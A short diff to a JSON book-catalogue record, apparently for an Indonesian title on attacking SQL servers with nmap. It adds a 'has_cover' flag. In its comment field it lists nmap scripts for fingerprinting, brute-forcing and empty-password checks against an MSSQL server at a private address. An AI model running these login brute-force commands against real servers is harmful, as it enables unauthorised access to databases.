@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/10291?v=1795436638",
   "cover_og_url": "/cover/10291/og?v=1795436638",
+  "has_cover": false,
   "url": "/book/nmap-serang-sql-onno-widodo-purbo/",
   "rating": null,
   "comment": "nmap dapat digunakan untuk melakukan serangan ke SQL nmap -p1433 --script ms-sql-info 192.168.0.80 nmap -p1433 --script ms-sql-brute 192.168.0.80 nmap -p1433 --script ms-sql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt 192.168.0.80 nmap -p1433 --script ms-sql-empty-password 192.168.0.80 nmap -p1433 --script ms-sql-hasdbaccess.nse --script-args mssql.username=sa",
